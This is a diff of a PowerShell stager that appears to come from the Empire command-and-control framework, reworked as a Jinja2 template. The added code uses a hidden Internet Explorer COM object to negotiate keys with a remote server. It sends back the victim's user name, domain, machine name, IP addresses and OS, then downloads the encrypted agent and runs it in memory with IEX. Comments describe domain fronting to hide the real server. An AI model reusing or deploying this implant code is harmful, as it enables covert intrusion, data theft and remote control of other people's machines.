@@ -1,23 +1,35 @@
+#################################################################
+# This file is a Jinja2 template.
+#    Variables:
+#        working_hours
+#        kill_date
+#        staging_key
+#        profile
+#################################################################
+
+{% include 'http_com/comms.ps1' %}
+
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
-    
+    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+
+
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
-            [Byte[]] $Str = 0..255;
+            [Byte[]] $S = 0..255;
             $J = 0;
             0..255 | ForEach-Object {
-                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
+                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $S[$_], $S[$J] = $S[$J], $S[$_];
             };
             $I = $J = 0;
         }
         process {
             ForEach($Byte in $In) {
                 $I = ($I + 1) % 256;
-                $J = ($J + $Str[$I]) % 256;
-                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
-                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
+                $J = ($J + $S[$I]) % 256;
+                $S[$I], $S[$J] = $S[$J], $S[$I];
+                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
             }
         }
     }
@@ -38,7 +50,7 @@ function Start-Negotiate {
 
             # extract the IV
             $IV = $In[0..15];
-           try {
+            try {
                 $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             }
             catch {
@@ -68,7 +80,6 @@ function Start-Negotiate {
     catch {
         $AES=New-Object System.Security.Cryptography.RijndaelManaged;
     }
-    
     $IV = [byte] 0..255 | Get-Random -count 16;
     $AES.Mode="CBC";
     $AES.Key=$SKB;
@@ -95,33 +106,21 @@ function Start-Negotiate {
 
     # if the web client doesn't exist, create a new web client and set appropriate options
     #   this only happens if this stager.ps1 code is NOT called from a launcher context
-    if(-not $wc) {
-        $wc=New-Object System.Net.WebClient;
-        # set the proxy settings for the WC to be the default system settings
-        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+    if(-not $IE) {
+        $IE=New-Object -COM InternetExplorer.Application;
+        $ie.Silent = $True;
+        $IE.visible = $False;
     }
 
-    if ($Script:Proxy) {
-        $wc.Proxy = $Script:Proxy;   
-    }
-
-    
-    # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
+        #If host header defined, assume domain fronting is in use and add a call to the base URL first
 	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
+        if ($customHeaders.Contains("Host: ")) {
+                $IE.navigate2($s,14,0,$Null,$Null);
+                while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
         }
     }
-    $wc.Headers.Add("User-Agent",$UA);
-    
+
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -134,7 +133,15 @@ function Start-Negotiate {
     $rc4p = $IV + $rc4p + $eb;
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $raw=$wc.UploadData($s+"/index.jsp","POST",$rc4p);
+    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p));
+    $IE.navigate2($s+"/{{ stage_1 }}", 14, 0, $bytes, $customHeaders);
+    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
+    $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
+
+    try {
+        $raw = [System.Convert]::FromBase64String($html);
+    }
+    catch {$Null};
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
     $de=$e.GetString($rs.decrypt($raw,$false));
@@ -160,26 +167,14 @@ function Start-Negotiate {
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-
-    try{
-        $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
-    }
-    catch {
-        $p = "[FAILED]"
-    }
-   
+    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
 
     # check if the IP is a string or the [IPv4,IPv6] array
     $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
     if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
     $i+="|$ip";
 
-    try{
-        $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
-    }
-    catch{
-        $i+='|'+'[FAILED]'
-    }
+    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
 
     # detect if we're SYSTEM or otherwise high-integrity
     if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
@@ -209,28 +204,16 @@ function Start-Negotiate {
     $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
     $rc4p2 = $IV2 + $rc4p2 + $eb2;
 
-    # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
+    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p2));
+    $IE.navigate2($s+"/{{ stage_2 }}", 14, 0, $bytes, $customHeaders);
+    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
+    $html = $IE.document.GetType().InvokeMember("body", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
+    try {
+        $raw = [System.Convert]::FromBase64String($html);
     }
-    $wc.Headers.Add("User-Agent",$UA);
-    $wc.Headers.Add("Hop-Name",$hop);
+    catch {$Null};
 
-    # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);
-
-    # # decrypt the agent and register the agent logic
-    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
-    # write-host "data len: $($Data.Length)";
+    # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
@@ -238,7 +221,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
+    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}";
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u -hop "$hop";
+Start-Negotiate -s "$ser" -SK '{{ staging_key }}' -UA $u;
